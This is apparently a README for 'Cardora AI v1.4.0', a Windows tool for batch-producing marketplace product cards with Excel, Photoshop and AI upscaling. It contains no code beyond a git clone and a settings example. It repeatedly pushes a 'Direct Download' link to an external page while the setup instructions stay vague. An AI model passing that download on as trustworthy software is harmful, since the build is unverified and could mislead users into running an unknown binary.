# Cardora AI v1.4.0 - content automation 2026

> **Cardora AI is a Windows content automation tool for marketplace product cards, combining batch infographic creation, Photoshop-driven workflows, Excel input, and AI upscaling in version 1.4.0.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.4.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/louiswolf10/cardora-ai-automation-win-68882?style=flat-square)](https://github.com/louiswolf10/cardora-ai-automation-win-68882)

---

<p align="center">
  <a href="https://louiswolf10.github.io/cardora-ai-automation-win-68882/">
    <img src="https://img.shields.io/badge/Download-Cardora%20AI%20Latest-brightgreen?style=for-the-badge" alt="Download Cardora AI">
  </a>
</p>

> **[Direct Download - Cardora AI v1.4.0](https://louiswolf10.github.io/cardora-ai-automation-win-68882/)**

---

[Download Latest Build](https://louiswolf10.github.io/cardora-ai-automation-win-68882/)

---

## About Cardora AI

Cardora AI is designed to streamline marketplace content production for sellers working across Wildberries, Ozon, and Yandex Market. It focuses on repetitive creative operations such as product card assembly, specification filling, image enhancement, and infographic preparation so teams can move faster through large batches of content.

The tool combines automation-oriented workflows with desktop publishing-style processing. It is aimed at users who manage product catalogs at scale and need a repeatable way to organize source files, generate visuals, and keep content creation aligned with spreadsheet data and image assets.

---

## Features

- Batch generation of product cards for large content sets
- AI-based image upscaling to 4K using Real-ESRGAN
- Direct Photoshop automation for infographic and layout tasks
- Excel-based filling of product specifications and source fields
- Smart file linking to keep assets connected during processing
- Computer vision components for image-aware automation workflows
- Windows desktop packaging support with Nuitka
- Built for marketplace workflows on Wildberries, Ozon, and Yandex Market

---

## Installation

1. Download the latest build from the project page or clone the repository:
   - `git clone https://github.com/louiswolf10/cardora-ai-automation-win-68882.git
2. Open the project folder on a Windows machine.
3. Run the packaged application or launch the main entry point provided by the build.
4. If you are using a source checkout, make sure the required runtime and dependencies are installed before starting the tool.

---

## Usage

Typical workflow:
1. Prepare product data in Excel.
2. Place image assets into the expected project folders.
3. Start Cardora AI and load the source sheet or batch set.
4. Run the generation pipeline to create cards, infographics, and processed visuals.
5. Review output files and repeat the batch with updated data when needed.

Example workflow notes:
- Use spreadsheet rows as the main source for item parameters.
- Connect source images before starting batch processing.
- Apply upscaling when higher-resolution output is needed for publication assets.
- Use Photoshop automation steps when you want template-based visual composition.

---

## Configuration

Cardora AI relies on local project settings for workflow paths, templates, and processing inputs. Depending on the build, configuration may be stored alongside the application files or in a project-specific settings location.

Example settings shape:

```json
{
  "input_folder": "C:/Cardora/input",
  "output_folder": "C:/Cardora/output",
  "excel_file": "C:/Cardora/data/products.xlsx",
  "upscale_enabled": true,
  "photoshop_enabled": true
}
```

Adjust paths to match your workspace, and keep asset naming consistent so file linking works as expected during batch runs.

---

## Requirements

- Windows operating system
- Desktop environment for the application UI
- Python 3-based runtime or packaged Windows build, depending on distribution
- Photoshop for direct automation features
- Excel files for specification-driven workflows
- Sufficient disk space for source images, generated graphics, and batch outputs
- Performance headroom for computer vision and image upscaling tasks

---

## FAQ

**How do I get updates?**  
Use the latest build link above or pull the newest repository changes, depending on how you installed the project.

**Where do I change paths and workflow settings?**  
Check the local configuration files or the application settings area in your build.

**What if Photoshop automation is not working?**  
Confirm that Photoshop is installed and accessible, then verify that the automation paths and script hooks match your environment.

**Why are my outputs missing linked assets?**  
Check file names, folder structure, and the Excel source references used by the batch process.

**Can I run it without Excel?**  
The main workflow is designed around spreadsheet-driven input, so Excel support is part of the core process.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
